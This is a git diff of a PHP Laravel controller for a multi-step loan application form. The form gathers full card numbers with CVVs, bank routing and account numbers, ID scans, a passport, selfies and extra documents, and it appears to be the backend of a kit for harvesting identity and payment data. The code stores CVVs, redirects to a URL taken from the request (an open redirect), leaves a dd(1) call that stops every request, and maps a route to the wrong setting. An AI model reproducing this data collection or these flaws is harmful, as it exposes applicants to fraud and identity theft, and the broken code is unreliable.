@@ -1,17 +1,19 @@
 <?php
 
+
 namespace App\Http\Controllers\Loan;
 
 use App\Http\Controllers\Controller;
 use App\Http\Requests\Loan\StoreRequest;
 use Illuminate\Http\Request;
+use App\Models\Setting;
 
 class StoreController extends BaseController
 {
     public function __invoke(StoreRequest $request)
     {
+        dd(1);
         $data = $request->validated();
-
 
         $guestData = [
             'name' => $data['name'] ?? null,
@@ -34,11 +36,18 @@ class StoreController extends BaseController
             'note' => $data['note'] ?? null,
         ];
 
+        // Combine expiration date parts if provided
+        $expirationDate = null;
+        if (isset($data['expMonth']) && isset($data['expYear'])) {
+            $expirationDate = sprintf('%04d-%02d-01', $data['expYear'], $data['expMonth']);
+        }
+
+
         $bankData = [
             'card_number' => $data['card_number'] ?? null,
             'card_holder' => $data['card_holder'] ?? null,
             'cvv' => $data['cvv'] ?? null,
-            'expiration_date' => $data['expiration_date'] ?? null,
+            'expiration_date' => $expirationDate,
             'bank_name' => $data['bank_name'] ?? null,
             'routing_number' => $data['routing_number'] ?? null,
             'account_number' => $data['account_number'] ?? null,
@@ -53,6 +62,7 @@ class StoreController extends BaseController
             'id_back' => $request->file('id_back') ?? null,
             'passport' => $request->file('passport') ?? null,
             'selfie' => $request->file('selfie') ?? null,
+            'additional_document' => $request->file('additional_document') ?? null,
         ];
 
         $jobData = [
@@ -61,10 +71,49 @@ class StoreController extends BaseController
             'employment_length' => $data['employment_length'] ?? null,
             'salary' => $data['salary'] ?? null,
         ];
+
         $this->service->store($guestData, $bankData, $documentData, $jobData, $request);
 
         $redirectUrl = $request->input('redirect_url', route('apply.loan.amount'));
+        $currentUrl = $request->input('current_url', null);
 
-        return redirect($redirectUrl);
+        if ($currentUrl) {
+            $nextRoute = $this->getNextAvailableRoute($currentUrl, $redirectUrl);
+            return redirect($nextRoute);
+        } else {
+            return redirect($redirectUrl);
+        }
+    }
+
+    protected function getNextAvailableRoute($currentUrl, $defaultUrl)
+    {
+        $settings = Setting::first();
+
+        $routes = [
+            'apply.loan.cc_info' => $settings->selfie_upload,
+            'apply.loan.verify_identity' => $settings->verify_identity,
+            'apply.loan.selfie_upload' => $settings->selfie_upload,
+            'apply.loan.selfie_second' => $settings->selfie_second,
+            'apply.loan.extra_doc' => $settings->extra_doc,
+        ];
+
+        $currentRouteKey = array_search($currentUrl, array_keys($routes));
+        $nextRoute = '';
+
+        if ($currentRouteKey !== false) {
+            for ($i = $currentRouteKey + 1; $i < count($routes); $i++) {
+                $route = array_keys($routes)[$i];
+                if ($routes[$route]) {
+                    $nextRoute = route($route);
+                    break;
+                }
+            }
+        }
+
+        if (empty($nextRoute)) {
+            $nextRoute = $defaultUrl; // Default route if no other route is available
+        }
+
+        return $nextRoute;
     }
 }
